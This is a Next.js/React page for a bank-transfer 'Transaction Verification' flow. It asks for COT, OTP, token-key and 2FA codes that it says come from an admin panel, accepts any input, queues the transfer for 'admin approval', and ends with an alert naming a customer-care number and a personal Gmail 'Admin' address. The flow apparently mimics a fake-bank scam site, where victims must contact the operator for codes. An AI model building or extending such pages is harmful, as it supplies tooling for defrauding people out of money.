"use client"

import type React from "react"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"

const verificationSteps = [
  { name: "COT Code", key: "cot" },
  { name: "OTP Code", key: "otp" },
  { name: "Token Key Code", key: "token" },
  { name: "2FA Code", key: "2fa" },
]

export default function VerificationPage() {
  const [currentStep, setCurrentStep] = useState(0)
  const [code, setCode] = useState("")
  const [transferDetails, setTransferDetails] = useState<any>(null)
  const router = useRouter()

  useEffect(() => {
    const details = localStorage.getItem("transferDetails")
    if (details) {
      setTransferDetails(JSON.parse(details))
    }
  }, [])

  const handleVerification = (e: React.FormEvent) => {
    e.preventDefault()

    if (currentStep < verificationSteps.length - 1) {
      setCurrentStep(currentStep + 1)
      setCode("")
    } else {
      // All verifications completed, now waiting for admin approval
      const transactionData = {
        ...transferDetails,
        id: Date.now(),
        status: "pending_approval",
        timestamp: new Date().toLocaleString(),
        verificationCompleted: true,
      }

      // Store in localStorage for admin to see
      const existingTransactions = JSON.parse(localStorage.getItem("pendingTransactions") || "[]")
      existingTransactions.push(transactionData)
      localStorage.setItem("pendingTransactions", JSON.stringify(existingTransactions))

      // Show completion message
      alert(`Verification completed! Your transaction is now waiting for admin approval.

If you have any questions, contact:
Customer Care: +1 (628) 400-3594
Admin: danielhenney707@gmail.com`)
      localStorage.removeItem("transferDetails")
      router.push("/dashboard")
    }
  }

  if (!transferDetails) {
    return <div>Loading...</div>
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 to-white flex items-center justify-center p-4">
      <Card className="w-full max-w-md">
        <CardHeader>
          <CardTitle className="text-blue-800">Transaction Verification</CardTitle>
          <p className="text-sm text-gray-600">
            Step {currentStep + 1} of {verificationSteps.length}
          </p>
        </CardHeader>
        <CardContent>
          <div className="mb-6 p-4 bg-yellow-50 rounded-lg">
            <p className="text-sm text-yellow-800 font-medium">Transaction Pending</p>
            <p className="text-sm text-yellow-600">Your transaction is being processed and requires verification.</p>
          </div>

          <div className="mb-4 p-3 bg-blue-50 rounded-lg">
            <p className="text-sm text-blue-800 font-medium">Transfer Details:</p>
            <p className="text-sm text-blue-600">Amount: ${transferDetails.amount}</p>
            {transferDetails.type === "others" && (
              <p className="text-sm text-blue-600">To: {transferDetails.bankName}</p>
            )}
          </div>

          <form onSubmit={handleVerification} className="space-y-4">
            <div className="space-y-2">
              <Label htmlFor="code">Enter {verificationSteps[currentStep].name}</Label>
              <Input
                id="code"
                type="text"
                placeholder={`Enter ${verificationSteps[currentStep].name}`}
                value={code}
                onChange={(e) => setCode(e.target.value)}
                required
              />
              <p className="text-xs text-gray-500">Code will be provided by admin panel</p>
            </div>

            <Button type="submit" className="w-full bg-blue-600 hover:bg-blue-700">
              Verify & Continue
            </Button>
          </form>
        </CardContent>
      </Card>
    </div>
  )
}
